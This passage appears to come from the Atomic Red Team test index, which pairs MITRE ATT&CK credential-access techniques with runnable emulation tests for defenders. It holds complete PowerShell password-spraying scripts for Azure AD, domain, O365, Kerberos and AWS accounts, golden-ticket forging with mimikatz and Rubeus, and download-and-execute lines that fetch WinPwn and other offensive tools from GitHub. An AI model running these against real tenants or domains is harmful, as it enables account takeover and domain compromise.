          default: iamthebatman
      dependency_executor_name: powershell
      dependencies:
      - description: 'AzureAD module must be installed.

          '
        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
          {exit 0} else {exit 1}} catch {exit 1}

          '
        get_prereq_command: 'Install-Module -Name AzureAD -Force

          '
      executor:
        name: powershell
        elevation_required: false
        command: |
          Import-Module -Name AzureAD
          $PWord = ConvertTo-SecureString -String "#{valid_password}" -AsPlainText -Force
          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{valid_username}", $Pword
          Connect-AzureAD -Credential $Credential > $null

          ($Users = Get-AzureADUser -All $true) > $null
          Disconnect-AzureAD > $null
          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force

          $Users | Foreach-Object {
            $user = $_.UserPrincipalName
            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$user", $Pword
            try {
              Write-Host " [-] Attempting #{password} on account ${user}."
              Connect-AzureAD -Credential $Credential 2>&1> $null
              # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
              Write-Host " [!] ${user}:#{password} are valid credentials!`r`n"
              Disconnect-AzureAD > $null
            } catch {
              Write-Host " [-] ${user}:#{password} invalid credentials.`r`n"
            }
          }
          Write-Host "End of password spraying"
    - name: WinPwn - DomainPasswordSpray Attacks
      auto_generated_guid: 5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82
      description: DomainPasswordSpray Attacks technique via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          domainpassspray -consoleoutput -noninteractive -emptypasswords
        name: powershell
    - name: Password Spray Invoke-DomainPasswordSpray Light
      auto_generated_guid: b15bc9a5-a4f3-4879-9304-ea0011ace63a
      description: "Perform a domain password spray using the same core method of
        the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray)
        \nbut without all the extra code that makes the script get blocked by many
        AVs. \nThis atomic test will attempt a single password against all users in
        a password list at $env:Temp\\usersdpsLight.txt. You can create this file
        manually\nor with the automated prereq_command. The prereq_command will limit
        the user list to 200 users by default to help you avoid massive account lockout.\n"
      supported_platforms:
      - windows
      input_arguments:
        user_limit:
          description: The max number of users to put in the list when running the
            prereq_command
          type: integer
          default: 200
        password:
          description: The password to try for each user in users.txt
          type: string
          default: Spring2020
      dependencies:
      - description: 'Username file must exist at $env:Temp\usersdpsLight.txt

          '
        prereq_command: 'if (Test-Path  $env:Temp\usersdpsLight.txt) {exit 0} else
          {exit 1}

          '
        get_prereq_command: "Write-Host -NoNewLine \"Reading Users.\" # this code
          modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput
          = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit
          = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount
          -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n
          \ foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n
          \   Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount
          + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n"
      executor:
        name: powershell
        elevation_required: false
        command: |
          function Invoke-dpsLight ($Password, $userlist) {
          $users = Get-Content $userlist
          $Domain = "LDAP://" + ([ADSI]"").distinguishedName
          foreach ($User in $users) {
            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
            if ($Domain_check.name -ne $null) {
              Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
            }
            else { Write-Host ". " -NoNewline}
          }
          Write-Host -ForegroundColor green "Finished"
          }
          Invoke-dpsLight "#{password}" $env:Temp\usersdpsLight.txt
    - name: Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)
      auto_generated_guid: f3a10056-0160-4785-8744-d9bd7c12dc39
      description: 'This test attempts to brute force a list of Microsoft Online (Azure/O365)
        users with a single password via the MSOLSpray Powershell module.

        '
      supported_platforms:
      - azure-ad
      input_arguments:
        password:
          description: Single password to try against the list of user accounts
          type: string
          default: P@ssword1
        user_list:
          description: File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)
          type: string
          default: "$env:temp\\T1110.003UserList.txt"
      dependency_executor_name: powershell
      dependencies:
      - description: 'MSOLSpray module must exist in $env:temp.

          '
        prereq_command: 'if (test-path $env:temp\MSOLSpray.ps1){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1"
          -outfile "$env:temp\MSOLSpray.ps1"

          '
      executor:
        name: powershell
        elevation_required: false
        command: |
          import-module "$env:temp\MSOLSpray.ps1"
          Invoke-MSOLSpray -UserList "#{user_list}" -Password "#{password}"
    - name: Password Spray using Kerbrute Tool
      auto_generated_guid: c6f25ec3-6475-47a9-b75d-09ac593c5ecb
      description: 'Test a single password against a list of users

        '
      supported_platforms:
      - windows
      input_arguments:
        domaincontroller:
          description: Domain controller where test will be run
          type: string
          default: "$ENV:userdnsdomain"
        domain:
          description: Domain where you will be testing
          type: string
          default: "$ENV:userdomain"
      dependency_executor_name: powershell
      dependencies:
      - description: 'kerbrute.exe must exist in $env:temp

          '
        prereq_command: 'if (test-path $env:temp\kerbrute.exe){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"
          -outfile "$env:temp\kerbrute.exe"

          '
      - description: 'passwordspray.txt must exist in $env:temp

          '
        prereq_command: 'if (test-path $env:temp\passwordspray.txt){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true"
          -outfile "$env:temp\passwordspray.txt"

          '
      executor:
        name: powershell
        elevation_required: false
        command: "cd $env:temp\n.\\kerbrute.exe passwordspray --dc #{domaincontroller}
          -d #{domain} $env:temp\\passwordspray.txt password132 \n"
    - name: AWS - Password Spray an AWS using GoAWSConsoleSpray
      auto_generated_guid: 9c10d16b-20b1-403a-8e67-50ef7117ed4e
      description: 'GoAWSConsoleSpray is a tool that can be used to spray AWS IAM
        Console Credentials in order to identify a valid login for a user account
        built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/

        '
      supported_platforms:
      - iaas:aws
      input_arguments:
        aws_account_id:
          description: ID of the AWS account
          type: string
          default: XXXXXXXX
      dependencies:
      - description: 'Check if go is installed

          '
        prereq_command: 'go version

          '
        get_prereq_command: 'echo Install GO

          '
      executor:
        command: |
          cd /tmp
          git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git
          cd /tmp/GoAWSConsoleSpray
          go run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt
        cleanup_command: 'rm -rf /tmp/GoAWSConsoleSpray

          '
        name: sh
        elevation_required: false
  T1056.003:
    technique:
      modified: '2023-03-30T21:01:46.711Z'
      name: Web Portal Capture
      description: |-
        Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.

        This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: File monitoring may be used to detect changes to files in
        the Web directory for organization login pages that do not match with authorized
        updates to the Web server's content.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'File: File Modification'
      x_mitre_system_requirements:
      - An externally facing login portal is configured.
      type: attack-pattern
      id: attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e
      created: '2020-02-11T18:59:50.058Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1056/003
        external_id: T1056.003
      - source_name: Volexity Virtual Private Keylogging
        description: 'Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco
          Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.'
        url: https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
    atomic_tests: []
  T1003.005:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ed Williams, Trustwave, SpiderLabs
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530
      type: attack-pattern
      created: '2020-02-21T15:42:25.991Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1003.005
        url: https://attack.mitre.org/techniques/T1003/005
      - source_name: Microsoft - Cached Creds
        url: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v%3Dws.11)
        description: Microsfot. (2016, August 21). Cached and Stored Credentials Technical
          Overview. Retrieved February 21, 2020.
      - source_name: PassLib mscache
        url: https://passlib.readthedocs.io/en/stable/lib/passlib.hash.msdcc2.html
        description: Eli Collins. (2016, November 25). Windows' Domain Cached Credentials
          v2. Retrieved February 21, 2020.
      - source_name: ired mscache
        url: https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
        description: Mantvydas Baranauskas. (2019, November 16). Dumping and Cracking
          mscash - Cached Domain Credentials. Retrieved February 21, 2020.
      - url: https://github.com/mattifestation/PowerSploit
        description: PowerSploit. (n.d.). Retrieved December 4, 2014.
        source_name: Powersploit
      modified: '2020-03-24T20:41:08.996Z'
      name: 'OS Credential Dumping: Cached Domain Credentials'
      description: |-
        Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)

        On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)

        With SYSTEM access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py can be used to extract the cached credentials.

        Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

        Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - SYSTEM
      identifier: T1003.005
    atomic_tests:
    - name: Cached Credential Dump via Cmdkey
      auto_generated_guid: 56506854-89d6-46a3-9804-b7fde90791f9
      description: |
        List credentials currently stored on the host via the built-in Windows utility cmdkey.exe
        Credentials listed with Cmdkey only pertain to the current user
        Passwords will not be displayed once they are stored
        https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey
        https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation
      supported_platforms:
      - windows
      executor:
        name: command_prompt
        elevation_required: false
        command: 'cmdkey /list

          '
  T1558.001:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Itamar Mizrahi, Cymptom
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1
      type: attack-pattern
      created: '2020-02-11T19:13:33.643Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1558.001
        url: https://attack.mitre.org/techniques/T1558/001
      - url: https://adsecurity.org/?p=1640
        description: Metcalf, S. (2015, August 7). Kerberos Golden Tickets are Now
          More Golden. Retrieved December 1, 2017.
        source_name: AdSecurity Kerberos GT Aug 2015
      - url: https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf
        description: Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016,
          April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.
        source_name: CERT-EU Golden Ticket Protection
      - url: https://adsecurity.org/?p=1515
        description: Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket
          (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December
          23, 2015.
        source_name: ADSecurity Detecting Forged Tickets
      - description: 'Sean Metcalf. (2014, November 10). Kerberos & KRBTGT: Active
          Directory‚Äôs Domain Kerberos Service Account. Retrieved January 30, 2020.'
        url: https://adsecurity.org/?p=483
        source_name: ADSecurity Kerberos and KRBTGT
      - source_name: Stealthbits Detect PtT 2019
        url: https://blog.stealthbits.com/detect-pass-the-ticket-attacks
        description: Jeff Warren. (2019, February 19). How to Detect Pass-the-Ticket
          Attacks. Retrieved February 27, 2020.
      - source_name: Microsoft Kerberos Golden Ticket
        url: https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285
        description: Microsoft. (2015, March 24). Kerberos Golden Ticket Check (Updated).
          Retrieved February 27, 2020.
      modified: '2020-11-05T16:07:03.779Z'
      name: 'Steal or Forge Kerberos Tickets: Golden Ticket'
      description: "Adversaries who have the KRBTGT account password hash may forge
        Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation:
        AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate
        authentication material for any account in Active Directory.(Citation: CERT-EU
        Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then
        able to request ticket granting service (TGS) tickets, which enable access
        to specific resources. Golden tickets require adversaries to interact with
        the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity
        Detecting Forged Tickets)\n\nThe KDC service runs all on domain controllers
        that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution
        Center (KDC) service account and is responsible for encrypting and signing
        all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT
        password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
        and privileged access to a domain controller."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: "Monitor for anomalous Kerberos activity, such as malformed
        or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634),
        RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation:
        ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation:
        Stealthbits Detect PtT 2019)\n\nMonitor the lifetime of TGT tickets for values
        that differ from the default domain duration.(Citation: Microsoft Kerberos
        Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)
        being used to move laterally. \n"
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Active Directory: Active Directory Credential Request'
      - 'Logon Session: Logon Session Metadata'
      x_mitre_permissions_required:
      - User
      identifier: T1558.001
    atomic_tests:
    - name: Crafting Active Directory golden tickets with mimikatz
      auto_generated_guid: 9726592a-dabc-4d4d-81cd-44070008b3af
      description: |
        Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
        This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
        The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
      supported_platforms:
      - windows
      input_arguments:
        domain_sid:
          description: SID of the targeted domain, if you keep default it will automatically
            get the current domain SID
          type: string
          default: S-1-5-21-DEFAULT
        domain:
          description: Targeted Active Directory domain FQDN
          type: string
          default: "%userdnsdomain%"
        account:
          description: Account to impersonate
          type: string
          default: goldenticketfakeuser
        krbtgt_aes256_key:
          description: Krbtgt AES256 key (you will need to set to match your krbtgt
            key for your domain)
          type: string
          default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
        mimikatz_path:
          description: Mimikatz windows executable
          type: path
          default: "$env:TEMP\\mimikatz\\x64\\mimikatz.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Mimikatz executor must exist on disk and at specified location
          (#{mimikatz_path})

          '
        prereq_command: |
          $mimikatz_path = cmd /c echo #{mimikatz_path}
          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
        get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"
          -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl
          = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath
          = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\"
          $basePath\n"
      executor:
        name: powershell
        elevation_required: false
        command: "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item
          $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if
          default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match
          \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n
          \ $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID
          = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n
          \ $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n#
          create batch file with commands to run in a separate \"runas /netonly\"
          session\n# so we don't purge Kerberos ticket from the current Windows session\n#
          its output goes to golden.txt temp file, because we cannot capture \"runas
          /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge
          existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path}
          \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key}
          /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n
          \ dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting
          SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@
          -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n#
          run batch file in a new empty session (password and username do not matter)\necho
          \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n#
          wait until the output file has logged the entire attack\ndo {\n  Start-Sleep
          1 # wait a bit so the output file has time to be created\n  Get-Content
          -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match
          'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy
          loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content
          $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat
          -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n"
    - name: Crafting Active Directory golden tickets with Rubeus
      auto_generated_guid: e42d33cd-205c-4acf-ab59-a9f38f6bad9c
      description: |
        Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
        This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
        The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
      supported_platforms:
      - windows
      input_arguments:
        domaincontroller:
          description: Targeted Active Directory domain FQDN
          type: string
          default: $ENV:logonserver.TrimStart('\') + "." + "$ENV:userdnsdomain"
        account:
          description: Account to impersonate
          type: string
          default: "$ENV:username"
        krbtgt_aes256_key:
          description: Krbtgt AES256 key (you will need to set to match your krbtgt
            key for your domain)
          type: string
          default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
        local_folder:
          description: Local path of Rubeus executable
          type: path
          default: "$Env:temp"
        local_executable:
          description: name of the rubeus executable
          type: string
          default: rubeus.exe
        rubeus_url:
          description: URL of Rubeus executable
          type: url
          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must be domain joined

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      - description: 'Rubeus must exist

          '
        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
          0} else {exit 1}

          '
        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}

          '
      executor:
        name: powershell
        elevation_required: false
        command: "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item
          $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"#{local_folder}\\#{local_executable}\"
          golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller})
          /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")}
          | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n#
          create batch file with commands to run in a separate \"runas /netonly\"
          session\n# so we don't purge Kerberos ticket from the current Windows session\n#
          its output goes to golden.txt temp file, because we cannot capture \"runas
          /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge
          existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n
          \ \"#{local_folder}\\#{local_executable}\" ptt /ticket:kirbifile\n\n  echo.\n
          \ echo Requesting SYSVOL:\n  dir \\\\$(#{domaincontroller})\\SYSVOL\n  \n
          \ echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo
          End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename |
          Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new
          empty session (password and username do not matter)\necho \"foo\" | runas
          /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until
          the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait
          a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\"
          -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack')
          { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n#
          show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n#
          cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item
          $env:TEMP\\golden.txt -ErrorAction Ignore\n"
  T1649:
    technique:
      modified: '2023-03-02T19:06:41.828Z'
      name: Steal or Forge Authentication Certificates
      description: |-
        Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)

        Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate‚Äôs extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate‚Äôs subject alternative name (SAN) values define the certificate owner‚Äôs alternate names.(Citation: Medium Certified Pre Owned)

        Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.

        Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as ‚Äúgolden‚Ä? certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: ''
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      - Azure AD
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.1'
      x_mitre_contributors:
      - Tristan Bennett, Seamless Intelligence
      - Lee Christensen, SpecterOps
      - Thirumalai Natarajan, Mandiant
      x_mitre_data_sources:
      - 'Active Directory: Active Directory Credential Request'
      - 'Windows Registry: Windows Registry Key Access'
      - 'Active Directory: Active Directory Object Modification'
      - 'Application Log: Application Log Content'
      - 'Logon Session: Logon Session Creation'
      - 'Command: Command Execution'
      - 'File: File Access'
      type: attack-pattern
      id: attack-pattern--7de1f7ac-5d0c-4c9c-8873-627202205331
      created: '2022-08-03T03:20:58.955Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1649
        external_id: T1649
      - source_name: GitHub GhostPack Certificates
        description: HarmJ0y. (2018, August 22). SharpDPAPI - Certificates. Retrieved
          August 2, 2022.
        url: https://github.com/GhostPack/SharpDPAPI#certificates
      - source_name: Microsoft AD CS Overview
        description: Microsoft. (2016, August 31). Active Directory Certificate Services
          Overview. Retrieved August 2, 2022.
        url: https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740(v=ws.11)
      - source_name: Medium Certified Pre Owned
        description: Schroeder, W. (2021, June 17). Certified Pre-Owned. Retrieved
          August 2, 2022.
        url: https://posts.specterops.io/certified-pre-owned-d95910965cd2
      - source_name: SpecterOps Certified Pre Owned
        description: Schroeder, W. & Christensen, L. (2021, June 22). Certified Pre-Owned
          - Abusing Active Directory Certificate Services. Retrieved August 2, 2022.
        url: https://web.archive.org/web/20220818094600/https://specterops.io/assets/resources/Certified_Pre-Owned.pdf
      - source_name: O365 Blog Azure AD Device IDs
        description: Syynimaa, N. (2022, February 15). Stealing and faking Azure AD
          device identities. Retrieved August 3, 2022.
        url: https://o365blog.com/post/deviceidentity/
      - source_name: GitHub CertStealer
        description: TheWover. (2021, April 21). CertStealer. Retrieved August 2,
          2022.
        url: https://github.com/TheWover/CertStealer
      - source_name: APT29 Deep Look at Credential Roaming
        description: 'Thibault Van Geluwe De Berlaere. (2022, November 8). They See
          Me Roaming: Following APT29 by Taking a Deeper Look at Windows Credential
          Roaming. Retrieved November 9, 2022.'
        url: https://www.mandiant.com/resources/blog/apt29-windows-credential-roaming
      object_marking_refs:
